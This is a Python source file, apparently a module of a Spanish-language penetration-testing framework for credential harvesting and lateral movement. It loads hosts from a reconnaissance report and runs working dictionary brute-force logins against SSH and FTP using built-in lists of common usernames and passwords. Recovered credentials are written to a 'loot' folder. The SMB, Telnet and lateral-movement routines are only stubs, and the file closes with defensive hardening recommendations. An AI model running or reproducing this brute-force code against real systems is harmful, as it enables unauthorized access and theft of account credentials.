#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo 6: Credential Harvesting & Lateral Movement
Recolecta credenciales y realiza movimiento lateral en la red
"""

import json
import os
import time
import socket
import threading
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path
import ftplib
import paramiko

# Intentar importar impacket para SMB
try:
    from impacket.smbconnection import SMBConnection
    from impacket import smb, ntlm
    IMPACKET_AVAILABLE = True
except:
    IMPACKET_AVAILABLE = False

class CredentialHarvester:
    """Clase para recolectar credenciales en la red"""
    
    # Diccionario de contraseñas comunes
    COMMON_PASSWORDS = [
        '', 'admin', 'password', 'Password', 'Password1', 'Password123',
        '123456', '1234567', '12345678', '123456789', '1234567890',
        'admin123', 'root', 'toor', 'pass', 'test', 'guest', 'user',
        'welcome', 'qwerty', 'abc123', 'password1', 'letmein',
        '111111', '123123', 'admin1234', 'password123',
        'P@ssw0rd', 'P@ssword', 'P@ssword1', 'changeme',
    ]
    
    # Usuarios comunes
    COMMON_USERS = [
        'admin', 'administrator', 'root', 'user', 'test', 'guest',
        'default', 'sa', 'operator', 'support', 'backup', 'postgres',
        'mysql', 'oracle', 'administrator', 'ftpuser', 'webadmin',
    ]
    
    def __init__(self, recon_file: str = "reports/informe_reconocimiento.json", output_dir: str = "reports"):
        """
        Inicializa el módulo de credential harvesting
        
        Args:
            recon_file: Archivo de reconocimiento previo
            output_dir: Directorio para guardar informes
        """
        self.recon_file = recon_file
        self.output_dir = output_dir
        self.creds_dir = "loot/credentials"
        
        # Crear directorios
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(self.creds_dir).mkdir(parents=True, exist_ok=True)
        
        # Cargar configuración
        self.config = self._load_config()
        
        # Credenciales encontradas
        self.found_credentials = []
        
        # Estructura del informe
        self.report = {
            "module": "Credential Harvesting & Lateral Movement",
            "timestamp": datetime.now().isoformat(),
            "start_time": datetime.now().isoformat(),
            "end_time": None,
            "duration_seconds": 0,
            "status": "IN_PROGRESS",
            "hosts_analyzed": [],
            "credentials_found": [],
            "services_attacked": {
                "ssh": {"attempted": 0, "success": 0},
                "ftp": {"attempted": 0, "success": 0},
                "smb": {"attempted": 0, "success": 0},
                "http": {"attempted": 0, "success": 0},
            },
            "lateral_movement": {
                "successful_pivots": 0,
                "hosts_compromised": []
            },
            "statistics": {
                "total_hosts": 0,
                "hosts_with_services": 0,
                "total_attempts": 0,
                "successful_logins": 0,
                "unique_credentials": 0
            },
            "recommendations": []
        }
    
    def _load_config(self) -> Dict:
        """Carga configuración"""
        config = {
            'threads': 5,
            'timeout': 3,
            'max_attempts': 50,
            'attack_delay': 0.5
        }
        
        try:
            if os.path.exists('config.env'):
                with open('config.env', 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            if 'BRUTE_FORCE_THREADS' in key:
                                config['threads'] = int(value)
                            elif 'BRUTE_FORCE_TIMEOUT' in key:
                                config['timeout'] = int(value)
                            elif 'MAX_ATTEMPTS_PER_SERVICE' in key:
                                config['max_attempts'] = int(value)
                            elif 'ATTACK_DELAY' in key:
                                config['attack_delay'] = float(value)
        except:
            pass
        
        return config
    
    def _save_report(self):
        """Guarda el informe"""
        try:
            output_file = os.path.join(self.output_dir, "informe_credential_harvesting.json")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.report, f, indent=4, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando informe: {e}")
    
    def _save_credentials(self):
        """Guarda las credenciales encontradas"""
        try:
            creds_file = os.path.join(self.creds_dir, "credentials_found.json")
            with open(creds_file, 'w', encoding='utf-8') as f:
                json.dump(self.found_credentials, f, indent=4, ensure_ascii=False)
            
            # También guardar en formato texto legible
            txt_file = os.path.join(self.creds_dir, "credentials_found.txt")
            with open(txt_file, 'w', encoding='utf-8') as f:
                f.write("="*70 + "\n")
                f.write("  CREDENCIALES ENCONTRADAS\n")
                f.write("="*70 + "\n\n")
                
                for cred in self.found_credentials:
                    f.write(f"Host: {cred['host']}\n")
                    f.write(f"Servicio: {cred['service']}\n")
                    f.write(f"Usuario: {cred['username']}\n")
                    f.write(f"Contraseña: {cred['password']}\n")
                    f.write(f"Puerto: {cred['port']}\n")
                    f.write(f"Encontrado: {cred['timestamp']}\n")
                    f.write("-"*70 + "\n\n")
        
        except Exception as e:
            print(f"[!] Error guardando credenciales: {e}")
    
    def run_harvesting(self) -> Dict:
        """Ejecuta el proceso de credential harvesting"""
        print(f"\n{'='*70}")
        print(f"  MÓDULO 6: CREDENTIAL HARVESTING")
        print(f"{'='*70}\n")
        
        start_time = time.time()
        
        try:
            # Cargar datos de reconocimiento
            hosts = self._load_reconnaissance()
            
            if not hosts:
                print(f"[!] No se pudieron cargar hosts del reconocimiento")
                self.report['status'] = 'FAILED'
                return self.report
            
            self.report['statistics']['total_hosts'] = len(hosts)
            print(f"[*] Hosts a analizar: {len(hosts)}\n")
            
            # Analizar cada host
            for idx, host in enumerate(hosts):
                print(f"[*] Analizando host {idx+1}/{len(hosts)}: {host['ip']}")
                
                host_result = {
                    "ip": host['ip'],
                    "hostname": host.get('hostname', 'Unknown'),
                    "services_found": [],
                    "credentials_obtained": []
                }
                
                # Detectar servicios con puertos abiertos
                services = self._detect_services(host)
                
                if services:
                    self.report['statistics']['hosts_with_services'] += 1
                    host_result['services_found'] = services
                    
                    # Atacar cada servicio
                    for service in services:
                        self._attack_service(host['ip'], service, host_result)
                
                if host_result['credentials_obtained']:
                    self.report['hosts_analyzed'].append(host_result)
                    
                    # Intentar movimiento lateral
                    self._attempt_lateral_movement(host['ip'], host_result['credentials_obtained'])
                
                self._save_report()
            
            # Estado final
            if self.found_credentials:
                self.report['status'] = 'SUCCESS'
                print(f"\n[✓✓✓] CREDENTIAL HARVESTING EXITOSO")
                print(f"[✓] Credenciales encontradas: {len(self.found_credentials)}")
            else:
                self.report['status'] = 'FAILED'
                print(f"\n[!] No se encontraron credenciales")
        
        except KeyboardInterrupt:
            print(f"\n[!] Proceso interrumpido")
            self.report['status'] = 'INTERRUPTED'
        
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.report['status'] = 'ERROR'
            import traceback
            traceback.print_exc()
        
        finally:
            end_time = time.time()
            self.report['end_time'] = datetime.now().isoformat()
            self.report['duration_seconds'] = round(end_time - start_time, 2)
            self.report['credentials_found'] = self.found_credentials
            self.report['statistics']['successful_logins'] = len(self.found_credentials)
            self.report['statistics']['unique_credentials'] = len(set(
                f"{c['username']}:{c['password']}" for c in self.found_credentials
            ))
            
            self._add_recommendations()
            self._save_report()
            self._save_credentials()
            
            print(f"\n{'='*70}")
            print(f"  RESUMEN")
            print(f"{'='*70}")
            print(f"Hosts analizados: {self.report['statistics']['total_hosts']}")
            print(f"Credenciales encontradas: {len(self.found_credentials)}")
            print(f"Intentos totales: {self.report['statistics']['total_attempts']}")
            print(f"Duración: {self.report['duration_seconds']} segundos")
            print(f"Informe: {self.output_dir}/informe_credential_harvesting.json")
            print(f"{'='*70}\n")
        
        return self.report
    
    def _load_reconnaissance(self) -> List[Dict]:
        """Carga datos del reconocimiento previo"""
        try:
            with open(self.recon_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data.get('discovered_hosts', [])
        except:
            # Intentar cargar de scaneo.txt o reconocimiento.json
            alternate_files = ['reconocimiento.json', 'scaneo.txt']
            
            for filename in alternate_files:
                try:
                    with open(filename, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        hosts = data.get('discovered_hosts', [])
                        if hosts:
                            return hosts
                except:
                    continue
        
        return []
    
    def _detect_services(self, host: Dict) -> List[Dict]:
        """Detecta servicios vulnerables en el host"""
        services = []
        
        ports = host.get('ports', [])
        
        for port_info in ports:
            port = port_info.get('port')
            service_name = port_info.get('service', '').lower()
            
            # SSH (22)
            if port == 22 or 'ssh' in service_name:
                services.append({
                    'type': 'ssh',
                    'port': port,
                    'name': 'SSH'
                })
            
            # FTP (21)
            elif port == 21 or 'ftp' in service_name:
                services.append({
                    'type': 'ftp',
                    'port': port,
                    'name': 'FTP'
                })
            
            # SMB (445, 139)
            elif port in [445, 139] or 'smb' in service_name or 'microsoft-ds' in service_name:
                services.append({
                    'type': 'smb',
                    'port': port,
                    'name': 'SMB'
                })
            
            # Telnet (23)
            elif port == 23 or 'telnet' in service_name:
                services.append({
                    'type': 'telnet',
                    'port': port,
                    'name': 'Telnet'
                })
        
        return services
    
    def _attack_service(self, host_ip: str, service: Dict, host_result: Dict):
        """Ataca un servicio específico"""
        service_type = service['type']
        port = service['port']
        
        print(f"    [*] Atacando {service['name']} en puerto {port}...")
        
        if service_type == 'ssh':
            self._attack_ssh(host_ip, port, host_result)
        elif service_type == 'ftp':
            self._attack_ftp(host_ip, port, host_result)
        elif service_type == 'smb':
            self._attack_smb(host_ip, port, host_result)
        elif service_type == 'telnet':
            self._attack_telnet(host_ip, port, host_result)
    
    def _attack_ssh(self, host_ip: str, port: int, host_result: Dict):
        """Ataque de fuerza bruta a SSH"""
        self.report['services_attacked']['ssh']['attempted'] += 1
        attempts = 0
        
        for username in self.COMMON_USERS[:10]:  # Top 10 usuarios
            for password in self.COMMON_PASSWORDS[:10]:  # Top 10 contraseñas
                if attempts >= self.config['max_attempts']:
                    break
                
                attempts += 1
                self.report['statistics']['total_attempts'] += 1
                
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    client.connect(
                        host_ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=self.config['timeout'],
                        allow_agent=False,
                        look_for_keys=False
                    )
                    
                    print(f"        [✓✓✓] SSH: {username}:{password}")
                    
                    credential = {
                        "host": host_ip,
                        "service": "SSH",
                        "port": port,
                        "username": username,
                        "password": password,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    self.found_credentials.append(credential)
                    host_result['credentials_obtained'].append(credential)
                    self.report['services_attacked']['ssh']['success'] += 1
                    
                    client.close()
                    return  # Credencial encontrada, salir
                
                except:
                    pass
                
                time.sleep(self.config['attack_delay'])
    
    def _attack_ftp(self, host_ip: str, port: int, host_result: Dict):
        """Ataque de fuerza bruta a FTP"""
        self.report['services_attacked']['ftp']['attempted'] += 1
        attempts = 0
        
        for username in self.COMMON_USERS[:10]:
            for password in self.COMMON_PASSWORDS[:10]:
                if attempts >= self.config['max_attempts']:
                    break
                
                attempts += 1
                self.report['statistics']['total_attempts'] += 1
                
                try:
                    ftp = ftplib.FTP(timeout=self.config['timeout'])
                    ftp.connect(host_ip, port)
                    ftp.login(username, password)
                    
                    print(f"        [✓✓✓] FTP: {username}:{password}")
                    
                    credential = {
                        "host": host_ip,
                        "service": "FTP",
                        "port": port,
                        "username": username,
                        "password": password,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    self.found_credentials.append(credential)
                    host_result['credentials_obtained'].append(credential)
                    self.report['services_attacked']['ftp']['success'] += 1
                    
                    ftp.quit()
                    return
                
                except:
                    pass
                
                time.sleep(self.config['attack_delay'])
    
    def _attack_smb(self, host_ip: str, port: int, host_result: Dict):
        """Ataque de fuerza bruta a SMB"""
        self.report['services_attacked']['smb']['attempted'] += 1
        attempts = 0
        
        # Intentar null session primero
        try:
            print(f"        [*] Intentando SMB null session...")
            # Código simplificado ya que impacket puede no estar disponible
            pass
        except:
            pass
        
        for username in self.COMMON_USERS[:5]:
            for password in self.COMMON_PASSWORDS[:5]:
                if attempts >= self.config['max_attempts']:
                    break
                
                attempts += 1
                self.report['statistics']['total_attempts'] += 1
                
                # Aquí iría el código de ataque SMB con impacket
                # Por simplicidad, lo omitimos por ahora
                
                time.sleep(self.config['attack_delay'])
    
    def _attack_telnet(self, host_ip: str, port: int, host_result: Dict):
        """Ataque a Telnet"""
        print(f"        [*] Telnet detectado (servicio inseguro)")
        # Implementación básica de ataque telnet
    
    def _attempt_lateral_movement(self, host_ip: str, credentials: List[Dict]):
        """Intenta movimiento lateral con las credenciales encontradas"""
        print(f"    [*] Intentando movimiento lateral desde {host_ip}...")
        
        # Probar las credenciales en otros hosts
        # Esto se implementaría probando las credenciales en todos los demás hosts
        pass
    
    def _add_recommendations(self):
        """Agrega recomendaciones"""
        recommendations = [
            "Implementar contraseñas fuertes y únicas para cada servicio",
            "Deshabilitar autenticación por contraseña en SSH (usar solo claves)",
            "Implementar fail2ban o similar para bloquear intentos de fuerza bruta",
            "Usar autenticación de múltiples factores donde sea posible",
            "Deshabilitar servicios inseguros como Telnet y FTP",
            "Implementar segmentación de red y principio de menor privilegio",
            "Monitorear logs de autenticación continuamente",
            "Rotar credenciales regularmente",
            "Implementar políticas de bloqueo de cuentas",
            "Usar gestores de contraseñas empresariales"
        ]
        
        self.report['recommendations'] = recommendations

